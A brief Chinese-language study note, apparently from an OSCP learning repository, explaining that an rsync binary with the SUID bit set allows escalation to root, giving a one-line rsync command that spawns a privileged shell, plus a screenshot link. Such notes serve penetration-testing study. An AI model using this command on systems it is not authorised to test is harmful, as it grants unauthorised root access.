 #rsync

`rsync` 若具有 `s` 权限，可使用如下命令直接提权至 root 权限：

```
rsync -e 'sh -p -c "sh -p 0<&2 1>&2"' 127.0.0.1:/dev/null
```
![rsync](https://github.com/Nongcloud/oscp-Learn/tree/master/Privilege-Escalation/SUID/images/suid-rsync.png)
